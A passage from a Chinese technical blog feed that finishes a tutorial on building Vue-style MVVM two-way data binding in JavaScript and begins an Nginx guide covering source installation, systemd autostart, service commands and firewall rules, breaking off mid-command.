class="comment">// 如 &lt;span v-text="content"&gt;&lt;/span&gt; 中指令为 v-text</span></span><br><span class="line">            <span class="keyword">var</span> attrName = attr.name;<span class="comment">// v-text</span></span><br><span class="line">            <span class="keyword">if</span> (me.isDirective(attrName)) &#123;</span><br><span class="line">                <span class="keyword">var</span> exp = attr.value; <span class="comment">// content</span></span><br><span class="line">                <span class="keyword">var</span> dir = attrName.substring(<span class="number">2</span>);<span class="comment">// text</span></span><br><span class="line">                <span class="keyword">if</span> (me.isEventDirective(dir)) &#123;</span><br><span class="line">                <span class="comment">// 事件指令, 如 v-on:click</span></span><br><span class="line">                    compileUtil.eventHandler(node, me.$vm, exp, dir);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 普通指令</span></span><br><span class="line">                    compileUtil[dir] &amp;&amp; compileUtil[dir](node, me.$vm, exp);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指令处理集合</span></span><br><span class="line"><span class="keyword">var</span> compileUtil = &#123;</span><br><span class="line">    text: <span class="function"><span class="keyword">function</span>(<span class="params">node, vm, exp</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.bind(node, vm, exp, <span class="string">'text'</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line">    bind: <span class="function"><span class="keyword">function</span>(<span class="params">node, vm, exp, dir</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> updaterFn = updater[dir + <span class="string">'Updater'</span>];</span><br><span class="line">        <span class="comment">// 第一次初始化视图</span></span><br><span class="line">        updaterFn &amp;&amp; updaterFn(node, vm[exp]);</span><br><span class="line">        <span class="comment">// 实例化订阅者，此操作会在对应的属性消息订阅器中添加了该订阅者watcher</span></span><br><span class="line">        <span class="keyword">new</span> Watcher(vm, exp, <span class="function"><span class="keyword">function</span>(<span class="params">value, oldValue</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 一旦属性值有变化，会收到通知执行此更新函数，更新视图</span></span><br><span class="line">            updaterFn &amp;&amp; updaterFn(node, value, oldValue);</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 更新函数</span></span><br><span class="line"><span class="keyword">var</span> updater = &#123;</span><br><span class="line">    textUpdater: <span class="function"><span class="keyword">function</span>(<span class="params">node, value</span>) </span>&#123;</span><br><span class="line">        node.textContent = <span class="keyword">typeof</span> value == <span class="string">'undefined'</span> ? <span class="string">''</span> : value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// ...省略</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>完整代码 <a href="https://github.com/poetries/mvvm/blob/master/compile.js" target="_blank" rel="noopener">https://github.com/poetries/mvvm/blob/master/compile.js</a></p></blockquote><ul><li>这里通过递归遍历保证了每个节点及子节点都会解析编译到</li><li>指令的声明规定是通过特定前缀的节点属性来标记，如<code>&lt;span v-text=&quot;content&quot;</code>中<code>v-text</code>便是指令</li><li>监听数据、绑定更新函数的处理是在<code>compileUtil.bind()</code>这个方法中，通过<code>new Watcher()</code>添加回调来接收数据变化的通知</li><li>至此，一个简单的<code>Compile</code>就完成了。接下来要看看<code>Watcher</code>这个订阅者的具体实现了</li></ul><h3 id="2-3-实现Watcher"><a href="#2-3-实现Watcher" class="headerlink" title="2.3 实现Watcher"></a>2.3 实现Watcher</h3><blockquote><p><code>Watcher</code>订阅者作为<code>Observer</code>和<code>Compile</code>之间通信的桥梁，主要做的事情是</p></blockquote><ul><li>在自身实例化时往属性订阅器<code>dep</code>里面添加自己</li><li>自身必须有一个<code>update()</code>方法</li><li>待属性变动<code>dep.notice()</code>通知时，能调用自身的<code>update()</code>方法，并触发<code>Compile</code>中绑定的回调，则功成身退。</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Watcher</span>(<span class="params">vm, exp, cb</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.cb = cb;</span><br><span class="line">    <span class="keyword">this</span>.vm = vm;</span><br><span class="line">    <span class="keyword">this</span>.exp = exp;</span><br><span class="line">    <span class="comment">// 此处为了触发属性的getter，从而在dep添加自己，结合Observer更易理解</span></span><br><span class="line">    <span class="keyword">this</span>.value = <span class="keyword">this</span>.get(); </span><br><span class="line">&#125;</span><br><span class="line">Watcher.prototype = &#123;</span><br><span class="line">    update: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.run();<span class="comment">// 属性值变化收到通知</span></span><br><span class="line">    &#125;,</span><br><span class="line">    run: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> value = <span class="keyword">this</span>.get(); <span class="comment">// 取到最新值</span></span><br><span class="line">        <span class="keyword">var</span> oldVal = <span class="keyword">this</span>.value;</span><br><span class="line">        <span class="keyword">if</span> (value !== oldVal) &#123;</span><br><span class="line">            <span class="keyword">this</span>.value = value;</span><br><span class="line">            <span class="keyword">this</span>.cb.call(<span class="keyword">this</span>.vm, value, oldVal); <span class="comment">// 执行Compile中绑定的回调，更新视图</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        Dep.target = <span class="keyword">this</span>;<span class="comment">// 将当前订阅者指向自己</span></span><br><span class="line">        <span class="keyword">var</span> value = <span class="keyword">this</span>.vm[exp];<span class="comment">// 触发getter，添加自己到属性订阅器中</span></span><br><span class="line">        Dep.target = <span class="literal">null</span>;<span class="comment">// 添加完毕，重置</span></span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 这里再次列出Observer和Dep，方便理解</span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(data, key, &#123;</span><br><span class="line">get: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="comment">// 由于需要在闭包内添加watcher，所以可以在Dep定义一个全局target属性，暂存watcher, 添加完移除</span></span><br><span class="line">Dep.target &amp;&amp; dep.addDep(Dep.target);</span><br><span class="line"><span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// ... 省略</span></span><br><span class="line">&#125;);</span><br><span class="line">Dep.prototype = &#123;</span><br><span class="line">    notify: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.subs.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">sub</span>) </span>&#123;</span><br><span class="line">            sub.update(); <span class="comment">// 调用订阅者的update方法，通知变化</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>完整代码 <a href="https://github.com/poetries/mvvm/blob/master/watcher.js" target="_blank" rel="noopener">https://github.com/poetries/mvvm/blob/master/watcher.js</a></p></blockquote><ul><li>实例化<code>Watcher</code>的时候，调用<code>get()</code>方法，通过<code>Dep.target = watcherInstance</code>标记订阅者是当前<code>watcher</code>实例，强行触发属性定义的<code>getter</code>方法，<code>getter</code>方法执行的时候，就会在属性的订阅器<code>dep</code>添加当前<code>watcher</code>实例，从而在属性值有变化的时候，<code>watcherInstance</code>就能收到更新通知。</li><li>基本上<code>vue</code>中数据绑定相关比较核心的几个模块也是这几个，猛戳<a href="https://github.com/vuejs/vue" target="_blank" rel="noopener">这里</a> , 在<code>src</code> 目录可找到<code>vue</code>源码。</li></ul><blockquote><p>最后来讲讲<code>MVVM</code>入口文件的相关逻辑和实现吧，相对就比较简单了</p></blockquote><h2 id="三、实现MVVM"><a href="#三、实现MVVM" class="headerlink" title="三、实现MVVM"></a>三、实现MVVM</h2><blockquote><p><code>MVVM</code>作为数据绑定的入口，整合<code>Observer</code>、<code>Compile</code>和<code>Watcher</code>三者，通过<code>Observer</code>来监听自己的<code>model</code>数据变化，通过<code>Compile</code>来解析编译模板指令，最终利用<code>Watcher</code>搭起<code>Observer</code>和<code>Compile</code>之间的通信桥梁，达到数据变化 -&gt; 视图更新；视图交互变化(<code>input</code>) -&gt; 数据<code>model</code>变更的双向绑定效果。</p></blockquote><ul><li>一个简单的<code>MVVM</code>构造器是这样子：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MVVM</span>(<span class="params">options</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.$options = options;</span><br><span class="line">    <span class="keyword">var</span> data = <span class="keyword">this</span>._data = <span class="keyword">this</span>.$options.data;</span><br><span class="line">    observe(data, <span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.$compile = <span class="keyword">new</span> Compile(options.el || <span class="built_in">document</span>.body, <span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>但是这里有个问题，从代码中可看出监听的数据对象是<code>options.data</code>，每次需要更新视图，则必须通过<code>var vm = new MVVM({data:{name: &#39;kindeng&#39;}}); vm._data.name = &#39;dmq&#39;;</code>这样的方式来改变数据。</li><li>显然不符合我们一开始的期望，我们所期望的调用方式应该是这样的：<br><code>var vm = new MVVM({data: {name: &#39;kindeng&#39;}}); vm.name = &#39;dmq&#39;;</code></li><li>所以这里需要给<code>MVVM</code>实例添加一个属性代理的方法，使访问<code>vm</code>的属性代理为访问<code>vm._data</code>的属性，改造后的代码如下：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">MVVM</span>(<span class="params">options</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.$options = options;</span><br><span class="line">    <span class="keyword">var</span> data = <span class="keyword">this</span>._data = <span class="keyword">this</span>.$options.data, me = <span class="keyword">this</span>;</span><br><span class="line">    <span class="comment">// 属性代理，实现 vm.xxx -&gt; vm._data.xxx</span></span><br><span class="line">    <span class="built_in">Object</span>.keys(data).forEach(<span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line">        me._proxy(key);</span><br><span class="line">    &#125;);</span><br><span class="line">    observe(data, <span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.$compile = <span class="keyword">new</span> Compile(options.el || <span class="built_in">document</span>.body, <span class="keyword">this</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MVVM.prototype = &#123;</span><br><span class="line">_proxy: <span class="function"><span class="keyword">function</span>(<span class="params">key</span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> me = <span class="keyword">this</span>;</span><br><span class="line">        <span class="built_in">Object</span>.defineProperty(me, key, &#123;</span><br><span class="line">            configurable: <span class="literal">false</span>,</span><br><span class="line">            enumerable: <span class="literal">true</span>,</span><br><span class="line">            get: <span class="function"><span class="keyword">function</span> <span class="title">proxyGetter</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">                <span class="keyword">return</span> me._data[key];</span><br><span class="line">            &#125;,</span><br><span class="line">            set: <span class="function"><span class="keyword">function</span> <span class="title">proxySetter</span>(<span class="params">newVal</span>) </span>&#123;</span><br><span class="line">                me._data[key] = newVal;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完整代码 <a href="https://github.com/poetries/mvvm/blob/master/mvvm.js" target="_blank" rel="noopener">https://github.com/poetries/mvvm/blob/master/mvvm.js</a></p><ul><li>这里主要还是利用了<code>Object.defineProperty()</code>这个方法来劫持了<code>vm</code>实例对象的属性的读写权，使读写<code>vm</code>实例的属性转成读写了<code>vm._data</code>的属性值，达到鱼目混珠的效果</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;完成的效果&lt;/p&gt;
&lt;/blockquote&gt;
&lt;figure class=&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;sp
      
    
    </summary>
    
      <category term="Front-End" scheme="http://blog.poetries.top/categories/Front-End/"/>
    
    
      <category term="MVVM" scheme="http://blog.poetries.top/tags/MVVM/"/>
    
  </entry>
  
  <entry>
    <title>Nginx学习篇</title>
    <link href="http://blog.poetries.top/2018/02/25/nginx-study/"/>
    <id>http://blog.poetries.top/2018/02/25/nginx-study/</id>
    <published>2018-02-25T07:12:08.000Z</published>
    <updated>2018-04-10T03:33:13.991Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><code>Nginx</code> 是一款面向性能设计的 <code>HTTP</code> 服务器，能反向代理 <code>HTTP</code>，<code>HTTPS</code> 和邮件相关(<code>SMTP</code>，<code>POP3</code>，<code>IMAP</code>)的协议链接。并且提供了负载均衡以及 <code>HTTP</code> 缓存。它的设计充分使用异步事件模型，削减上下文调度的开销，提高服务器并发能力。采用了模块化设计，提供了丰富模块的第三方模块。</p></blockquote><ul><li>所以关于 `Nginx，有这些标签：「异步」「事件」「模块化」「高性能」「高并发」「反向代理」「负载均衡」</li></ul><h2 id="一、安装"><a href="#一、安装" class="headerlink" title="一、安装"></a>一、安装</h2><h3 id="1-1-安装依赖"><a href="#1-1-安装依赖" class="headerlink" title="1.1 安装依赖"></a>1.1 安装依赖</h3><blockquote><p><code>prce</code>(重定向支持)和<code>openssl</code>(<code>https</code>支持，如果不需要<code>https</code>可以不安装)</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install -y pcre-devel </span><br><span class="line">yum -y install gcc make gcc-c++ wget</span><br><span class="line">yum -y install openssl openssl-devel</span><br></pre></td></tr></table></figure><p><code>CentOS 6.5</code> 我安装的时候是选择的“基本服务器”，默认这两个包都没安装全，所以这两个都运行安装即可</p><h3 id="1-2-下载"><a href="#1-2-下载" class="headerlink" title="1.2 下载"></a>1.2 下载</h3><p><a href="http://nginx.org/download/" target="_blank" rel="noopener">nginx的所有版本在这里</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wget http://nginx.org/download/nginx-1.13.3.tar.gz</span><br><span class="line">wget http://nginx.org/download/nginx-1.13.7.tar.gz</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果没有安装wget</span></span><br><span class="line"><span class="comment"># 下载已编译版本</span></span><br><span class="line">$ yum install wget</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解压压缩包</span></span><br><span class="line">tar zxf nginx-1.13.3.tar.gz</span><br></pre></td></tr></table></figure><h3 id="1-3-编译安装"><a href="#1-3-编译安装" class="headerlink" title="1.3 编译安装"></a>1.3 编译安装</h3><p>然后进入目录编译安装，<a href="#configure参数说明">configure参数说明</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> nginx-1.11.5</span><br><span class="line">./configure</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">....</span><br><span class="line">Configuration summary</span><br><span class="line">  + using system PCRE library</span><br><span class="line">  + OpenSSL library is not used</span><br><span class="line">  + using system zlib library</span><br><span class="line"></span><br><span class="line">  nginx path prefix: <span class="string">"/usr/local/nginx"</span></span><br><span class="line">  nginx binary file: <span class="string">"/usr/local/nginx/sbin/nginx"</span></span><br><span class="line">  nginx modules path: <span class="string">"/usr/local/nginx/modules"</span></span><br><span class="line">  nginx configuration prefix: <span class="string">"/usr/local/nginx/conf"</span></span><br><span class="line">  nginx configuration file: <span class="string">"/usr/local/nginx/conf/nginx.conf"</span></span><br><span class="line">  nginx pid file: <span class="string">"/usr/local/nginx/logs/nginx.pid"</span></span><br><span class="line">  nginx error <span class="built_in">log</span> file: <span class="string">"/usr/local/nginx/logs/error.log"</span></span><br><span class="line">  nginx http access <span class="built_in">log</span> file: <span class="string">"/usr/local/nginx/logs/access.log"</span></span><br><span class="line">  nginx http client request body temporary files: <span class="string">"client_body_temp"</span></span><br><span class="line">  nginx http proxy temporary files: <span class="string">"proxy_temp"</span></span><br><span class="line">  nginx http fastcgi temporary files: <span class="string">"fastcgi_temp"</span></span><br><span class="line">  nginx http uwsgi temporary files: <span class="string">"uwsgi_temp"</span></span><br><span class="line">  nginx http scgi temporary files: <span class="string">"scgi_temp"</span></span><br></pre></td></tr></table></figure><blockquote><p>安装报错误的话比如：<code>“C compiler cc is not found”</code>，这个就是缺少编译环境，安装一下就可以了 <code>yum -y install gcc make gcc-c++ openssl-devel</code></p></blockquote><p>如果没有<code>error</code>信息，就可以执行下边的安装了：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure><h3 id="1-4-nginx测试"><a href="#1-4-nginx测试" class="headerlink" title="1.4 nginx测试"></a>1.4 nginx测试</h3><ul><li>运行下面命令会出现两个结果，一般情况<code>nginx</code>会安装在<code>/usr/local/nginx</code>目录中</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /usr/<span class="built_in">local</span>/nginx/sbin/</span><br><span class="line">./nginx -t</span><br><span class="line"></span><br><span class="line"><span class="comment"># nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok</span></span><br><span class="line"><span class="comment"># nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful</span></span><br></pre></td></tr></table></figure><h3 id="1-5-设置全局nginx命令"><a href="#1-5-设置全局nginx命令" class="headerlink" title="1.5 设置全局nginx命令"></a>1.5 设置全局nginx命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi ~/.bash_profile</span><br></pre></td></tr></table></figure><p>将下面内容添加到 <code>~/.bash_profile</code> 文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PATH=<span class="variable">$PATH</span>:<span class="variable">$HOME</span>/bin:/usr/<span class="built_in">local</span>/nginx/sbin/</span><br><span class="line"><span class="built_in">export</span> PATH</span><br></pre></td></tr></table></figure><p>运行命令 <strong><code>source ~/.bash_profile</code></strong> 让配置立即生效。你就可以全局运行 <code>nginx</code> 命令了。</p><h2 id="二、开机自启动"><a href="#二、开机自启动" class="headerlink" title="二、开机自启动"></a>二、开机自启动</h2><p><strong>开机自启动方法一</strong></p><ul><li>编辑 <strong><code>vi /lib/systemd/system/nginx.service</code></strong> 文件，没有创建一个 <strong><code>touch nginx.service</code></strong> - 然后将如下内容根据具体情况进行修改后，添加到<code>nginx.service</code>文件中：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=nginx</span><br><span class="line">After=network.target remote-fs.target nss-lookup.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line"></span><br><span class="line">Type=forking</span><br><span class="line">PIDFile=/var/run/nginx.pid</span><br><span class="line">ExecStartPre=/usr/<span class="built_in">local</span>/nginx/sbin/nginx -t -c /usr/<span class="built_in">local</span>/nginx/conf/nginx.conf</span><br><span class="line">ExecStart=/usr/<span class="built_in">local</span>/nginx/sbin/nginx -c /usr/<span class="built_in">local</span>/nginx/conf/nginx.conf</span><br><span class="line">ExecReload=/bin/<span class="built_in">kill</span> -s HUP <span class="variable">$MAINPID</span></span><br><span class="line">ExecStop=/bin/<span class="built_in">kill</span> -s QUIT <span class="variable">$MAINPID</span></span><br><span class="line">PrivateTmp=<span class="literal">true</span></span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Unit]:服务的说明  </span><br><span class="line">Description:描述服务  </span><br><span class="line">After:描述服务类别  </span><br><span class="line">[Service]服务运行参数的设置  </span><br><span class="line">Type=forking是后台运行的形式  </span><br><span class="line">ExecStart为服务的具体运行命令  </span><br><span class="line">ExecReload为重启命令  </span><br><span class="line">ExecStop为停止命令  </span><br><span class="line">PrivateTmp=True表示给服务分配独立的临时空间  </span><br><span class="line">注意：[Service]的启动、重启、停止命令全部要求使用绝对路径  </span><br><span class="line">[Install]运行级别下服务安装的相关设置，可设置为多用户，即系统运行级别为3</span><br></pre></td></tr></table></figure><p>保存退出。</p><p>设置开机启动，使配置生效：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">systemctl <span class="built_in">enable</span> nginx.service</span><br><span class="line"><span class="comment"># 输出下面内容表示成功了</span></span><br><span class="line">Created symlink from /etc/systemd/system/multi-user.target.wants/nginx.service to /usr/lib/systemd/system/nginx.service.</span><br></pre></td></tr></table></figure><p><strong>开机自启动方法二</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/rc.local</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在 rc.local 文件中，添加下面这条命令</span></span><br><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx start</span><br></pre></td></tr></table></figure><ul><li>如果开机后发现自启动脚本没有执行，你要去确认一下<code>rc.local</code>这个文件的访问权限是否是可执行的，因为<code>rc.local</code>默认是不可执行的。修改<code>rc.local</code>访问权限，增加可执行权限：</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod +x /etc/rc.d/rc.local</span><br></pre></td></tr></table></figure><h2 id="三、运维"><a href="#三、运维" class="headerlink" title="三、运维"></a>三、运维</h2><h3 id="3-1-服务管理"><a href="#3-1-服务管理" class="headerlink" title="3.1 服务管理"></a>3.1 服务管理</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动</span></span><br><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx -s reload</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关闭进程</span></span><br><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx -s stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 平滑关闭nginx</span></span><br><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx -s quit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看nginx的安装状态，</span></span><br><span class="line">/usr/<span class="built_in">local</span>/nginx/sbin/nginx -V</span><br></pre></td></tr></table></figure><p><strong>关闭防火墙，或者添加防火墙规则就可以测试了</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service iptables stop</span><br></pre></td></tr></table></figure><p>或者编辑配置文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/sysconfig/iptables</span><br></pre></td></tr></table></figure><p>添加这样一条开放80端口的规则后保存：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT</span><br></pre></td></tr></table></figure><p>重启服务即可:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service iptables restart</span><br><span class="line"><span class="comment"># 命令进行查看目前nat</span></span><br><span class="line">iptables -t nat -L</span><br></pre></td></tr></table></figure><h3 id="3-2-重启服务防火墙报错解决"><a href="#3-2-重启服务防火墙报错解决" class="headerlink" title="3.2 重启服务防火墙报错解决"></a>3.2 重启服务防火墙报错解决</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service iptables restart</span><br><span class="line"><span class="comment"># Redirecting to /bin/systemctl restart  iptables.service</span></span><br><span class="line"><span class="comment"># Failed to restart iptables.service: Unit iptables.service failed to load: No such file or directory.</span></span><br></pre></td></tr></table></figure><ul><li>在<code>CentOS 7</code>或<code>RHEL 7</code>或<code>Fedora</code>中防火墙由 <strong><code>firewalld</code></strong> 来管理，当然你可以还原传统的管理方式。或则使用新的命令进行管理。<br>假如采用传统请执行一下命令</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 传统命令</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">systemctl mask firewalld</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 安装命令</span></span><br><span class="line">yum install iptables-services</span><br><span class="line"></span><br><span class="line">systemctl <span class="built_in">enable</span> iptables </span><br><span class="line">service iptables restart</span><br></pre></td></tr></table></figure><h2 id="四、nginx卸载"><a href="#四、nginx卸载" class="headerlink" title="四、nginx卸载"></a>四、nginx卸载</h2><ul><li>如果通过<code>yum</code>安装，使用下面命令安装。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum remove 